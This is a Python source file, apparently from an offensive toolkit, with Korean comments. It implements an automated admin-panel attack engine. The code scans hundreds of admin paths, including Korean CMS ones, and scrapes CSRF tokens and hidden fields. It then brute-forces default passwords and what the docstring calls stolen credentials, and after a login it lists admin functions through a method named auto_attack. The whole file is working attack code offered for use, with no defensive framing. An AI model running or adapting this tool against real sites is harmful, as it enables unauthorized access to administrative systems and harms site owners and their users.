"""bingo/tools/admin_panel_auto.py — 관리자 패널 자동 로그인 엔진 (v2.9.0)

기능:
  - 관리자 패널 경로 자동 탐지 (500+ 경로)
  - CSRF 토큰 자동 추출 후 POST
  - 탈취한 자격증명 자동 시도
  - 세션 쿠키 자동 저장 및 재사용
  - Playwright 기반 스크린샷 (playwright_engine 연동)
  - 로그인 후 관리자 기능 자동 열거
"""
from __future__ import annotations

import re
import urllib.parse
from dataclasses import dataclass, field
from typing import Callable


@dataclass
class AdminLoginResult:
    panel_url: str
    username: str
    password: str
    success: bool
    session_cookie: str = ""
    admin_pages: list[str] = field(default_factory=list)
    screenshot_path: str = ""
    technique: str = "form_post"


@dataclass
class AdminReport:
    target: str
    panel_url: str = ""
    login_results: list[AdminLoginResult] = field(default_factory=list)
    admin_functions: list[str] = field(default_factory=list)

    def summary(self) -> str:
        lines = [f"[ADMIN AUTO] {self.target} | 패널: {self.panel_url}"]
        for r in self.login_results:
            ok = "✅ LOGIN SUCCESS" if r.success else "❌ fail"
            lines.append(f"  {ok} {r.username}:{r.password} → cookie={r.session_cookie[:30]}...")
        return "\n".join(lines)


# ══════════════════════════════════════════════════════════════════════════════
# 관리자 경로 목록
# ══════════════════════════════════════════════════════════════════════════════

ADMIN_PATHS = [
    "/admin", "/admin/", "/admin/login", "/admin/index",
    "/admin/login.php", "/admin/index.php", "/admin.php",
    "/administrator", "/administrator/index.php", "/administrator/",
    "/manage", "/manager", "/management",
    "/cms", "/cms/login", "/dashboard",
    "/wp-admin", "/wp-login.php",
    "/adm", "/adm/", "/adm/admin.php",
    "/panel", "/panel/", "/cpanel", "/hosting/admin",
    "/backend", "/backend/login",
    "/staff", "/staff/login",
    "/superuser", "/su",
    "/control", "/controlpanel",
    "/master", "/master/login",
    "/siteadmin", "/webadmin",
    "/admloginuser.php", "/admin1", "/admin2",
    "/useradmin", "/sadmin",
    # 한국 CMS
    "/padmin", "/padmin/", "/padmin/index.php",
    "/gnuboard5/adm", "/bbs/adm",
    "/xe/index.php?module=admin",
    "/zbxe/?module=admin",
    "/rhymix/admin",
    # 게시판
    "/bbs/admin", "/board/admin", "/community/admin",
    # 기타
    "/api/admin", "/api/v1/admin", "/api/management",
    "/swagger-ui", "/swagger-ui.html", "/api-docs",
    "/actuator", "/actuator/env", "/actuator/dump",
    "/phpmyadmin", "/pma", "/mysqladmin",
    "/adminer.php", "/adminer",
]

# 로그인 폼 필드 이름 변형
USERNAME_FIELDS = ["username", "user", "userid", "id", "login", "email", "admin_id", "member_id"]
PASSWORD_FIELDS = ["password", "pass", "passwd", "pw", "pwd", "secret"]

# 로그인 성공 지표
LOGIN_SUCCESS_INDICATORS = [
    "dashboard", "logout", "welcome", "관리자", "관리", "admin panel",
    "사용자 목록", "회원 관리", "게시판 관리", "환경설정",
    "Users", "Members", "Configuration", "Settings", "Sign out",
]
LOGIN_FAIL_INDICATORS = [
    "invalid", "incorrect", "wrong", "failed", "error", "존재하지",
    "일치하지", "로그인 실패", "비밀번호가", "아이디가",
]


# ══════════════════════════════════════════════════════════════════════════════
# CSRF 토큰 추출
# ══════════════════════════════════════════════════════════════════════════════

class CsrfTokenExtractor:
    """페이지에서 CSRF 토큰 자동 추출"""

    CSRF_PATTERNS = [
        r'<input[^>]+name=["\']?csrf[_-]?token["\']?[^>]+value=["\']([^"\']+)["\']',
        r'<input[^>]+name=["\']?_token["\']?[^>]+value=["\']([^"\']+)["\']',
        r'<input[^>]+name=["\']?csrfmiddlewaretoken["\']?[^>]+value=["\']([^"\']+)["\']',
        r'<input[^>]+name=["\']?authenticity_token["\']?[^>]+value=["\']([^"\']+)["\']',
        r'<meta[^>]+name=["\']?csrf-token["\']?[^>]+content=["\']([^"\']+)["\']',
        r'["\']csrf[_-]?token["\']\s*[:=]\s*["\']([^"\']+)["\']',
        r'["\']_token["\']\s*[:=]\s*["\']([^"\']+)["\']',
        r'X-CSRF-Token["\']?\s*:\s*["\']?([a-zA-Z0-9+/=_\-]{20,})',
    ]

    @classmethod
    def extract(cls, html: str) -> str | None:
        for pat in cls.CSRF_PATTERNS:
            m = re.search(pat, html, re.IGNORECASE)
            if m:
                return m.group(1)
        return None

    @classmethod
    def extract_all_hidden(cls, html: str) -> dict[str, str]:
        """숨겨진 input 필드 전체 추출"""
        result = {}
        for m in re.finditer(
            r'<input[^>]+type=["\']hidden["\'][^>]*>',
            html, re.IGNORECASE
        ):
            tag = m.group(0)
            name_m = re.search(r'name=["\']([^"\']+)["\']', tag)
            val_m = re.search(r'value=["\']([^"\']+)["\']', tag)
            if name_m and val_m:
                result[name_m.group(1)] = val_m.group(1)
        return result


# ══════════════════════════════════════════════════════════════════════════════
# 로그인 폼 분석
# ══════════════════════════════════════════════════════════════════════════════

class LoginFormAnalyzer:
    """로그인 폼 구조 자동 분석"""

    @staticmethod
    def find_form_action(html: str, base_url: str) -> str:
        """폼 action URL 추출"""
        m = re.search(r'<form[^>]+action=["\']([^"\']*)["\']', html, re.IGNORECASE)
        if m and m.group(1):
            action = m.group(1)
            if action.startswith("http"):
                return action
            base = re.match(r"(https?://[^/]+)", base_url)
            if base:
                return base.group(1) + (action if action.startswith("/") else "/" + action)
        return base_url

    @staticmethod
    def detect_field_names(html: str) -> tuple[str, str]:
        """사용자명/비밀번호 필드 이름 자동 탐지"""
        username_field = "username"
        password_field = "password"
        # 비밀번호 필드 탐지
        pw_m = re.search(r'<input[^>]+type=["\']password["\'][^>]*name=["\']([^"\']+)["\']', html, re.IGNORECASE)
        if not pw_m:
            pw_m = re.search(r'<input[^>]+name=["\']([^"\']+)["\'][^>]*type=["\']password["\']', html, re.IGNORECASE)
        if pw_m:
            password_field = pw_m.group(1)
        # 사용자명 필드 탐지 (password 필드 앞)
        inputs = re.findall(r'<input[^>]+>', html, re.IGNORECASE)
        for inp in inputs:
            if 'type="text"' in inp.lower() or 'type="email"' in inp.lower():
                nm = re.search(r'name=["\']([^"\']+)["\']', inp)
                if nm:
                    username_field = nm.group(1)
                    break
        return username_field, password_field


# ══════════════════════════════════════════════════════════════════════════════
# 메인 관리자 패널 자동화 엔진
# ══════════════════════════════════════════════════════════════════════════════

class AdminPanelAuto:
    """관리자 패널 탐지 → 자동 로그인 → 기능 열거"""

    def __init__(
        self,
        request_fn: Callable[[str, str, dict, str], tuple[int, str]],
        credentials: list[tuple[str, str]] | None = None,
    ) -> None:
        self.req = request_fn
        self.credentials = credentials or [
            ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
            ("admin", "admin123"), ("administrator", "admin"),
            ("admin", ""), ("root", "root"), ("admin", "1234"),
        ]

    def find_admin_panel(self, base_url: str) -> str | None:
        """관리자 패널 경로 탐지"""
        domain = re.match(r"(https?://[^/]+)", base_url)
        if not domain:
            return None
        base = domain.group(1)
        for path in ADMIN_PATHS:
            url = base + path
            status, body = self.req(url, "GET", {}, "")
            if status in (200, 401, 403):
                # 로그인 폼이 있으면 확실
                if re.search(r'type=["\']password["\']', body, re.IGNORECASE):
                    return url
                if status in (401, 403):
                    return url
        return None

    def try_login(
        self, panel_url: str, username: str, password: str
    ) -> AdminLoginResult:
        result = AdminLoginResult(panel_url=panel_url, username=username, password=password, success=False)
        # 로그인 페이지 GET
        _, html = self.req(panel_url, "GET", {}, "")

        # 폼 분석
        form_action = LoginFormAnalyzer.find_form_action(html, panel_url)
        user_field, pw_field = LoginFormAnalyzer.detect_field_names(html)

        # CSRF 토큰
        hidden_fields = CsrfTokenExtractor.extract_all_hidden(html)
        hidden_fields[user_field] = username
        hidden_fields[pw_field] = password

        body_str = "&".join(f"{urllib.parse.quote(k)}={urllib.parse.quote(v)}" for k, v in hidden_fields.items())
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": panel_url,
        }

        status, response = self.req(form_action, "POST", headers, body_str)

        # 로그인 성공 판단
        for indicator in LOGIN_SUCCESS_INDICATORS:
            if indicator.lower() in response.lower():
                result.success = True
                break
        for fail_indicator in LOGIN_FAIL_INDICATORS:
            if fail_indicator.lower() in response.lower():
                result.success = False
                break

        if status in (302, 301) and not any(fi in response.lower() for fi in LOGIN_FAIL_INDICATORS):
            result.success = True

        return result

    def brute_credentials(self, panel_url: str, extra_creds: list[tuple[str, str]] | None = None) -> AdminLoginResult | None:
        """자격증명 자동 시도"""
        all_creds = list(self.credentials)
        if extra_creds:
            all_creds = extra_creds + all_creds

        for username, password in all_creds:
            result = self.try_login(panel_url, username, password)
            if result.success:
                return result
        return None

    def enumerate_admin_functions(self, panel_url: str, session_cookie: str) -> list[str]:
        """로그인 후 관리자 기능 열거"""
        found = []
        _, body = self.req(panel_url, "GET", {"Cookie": session_cookie}, "")
        # 링크 추출
        links = re.findall(r'href=["\']([^"\']+)["\']', body, re.IGNORECASE)
        admin_keywords = ["user", "member", "config", "setting", "upload", "file", "log", "report", "system"]
        for link in links:
            if any(kw in link.lower() for kw in admin_keywords):
                found.append(link)
        return found[:20]

    def auto_attack(self, base_url: str, extra_creds: list[tuple[str, str]] | None = None) -> AdminReport:
        report = AdminReport(target=base_url)
        panel = self.find_admin_panel(base_url)
        if not panel:
            return report
        report.panel_url = panel
        result = self.brute_credentials(panel, extra_creds)
        if result:
            report.login_results.append(result)
            if result.session_cookie:
                report.admin_functions = self.enumerate_admin_functions(panel, result.session_cookie)
        return report
